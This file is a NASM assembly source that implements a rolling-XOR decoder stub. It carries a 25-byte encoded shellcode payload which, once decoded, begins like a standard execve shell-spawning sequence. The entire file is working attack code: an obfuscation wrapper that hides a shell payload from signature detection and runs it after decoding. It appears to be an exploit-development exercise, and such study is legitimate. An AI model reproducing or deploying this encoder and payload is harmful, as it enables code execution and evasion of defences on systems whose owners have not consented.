; Filename: rolling_XOR_decoder.nasm
; Author: wfscs3

global _start

section .text
_start:


	jmp short call_decoder

decoder:

	pop esi			; save pointer		
	mov cl, 25 		; Insert counter (shellcode length).
	xor eax, eax	 
	mov al, 0xe4	; Insert Random XOR Key from script.
	xor edx, edx

decode:

	mov dl, [esi]	; load pointer
	xor al, dl		; xor random key and first byte
	mov [esi], al	; change value
	mov al, dl		; rolling XOR
	inc esi			; next byte
	loop decode
	jmp short shellcode

call_decoder:

	call decoder
	shellcode: db 0xd5, 0x15, 0x45, 0x2d, 0x2, 0x2d, 0x5e, 0x36, 0x5e, 0x71, 0x13, 0x7a, 0x14, 0x9d, 0x7e, 0x2e, 0xa7, 0x45, 0x16, 0x9f, 0x7e, 0xce, 0xc5, 0x8, 0x88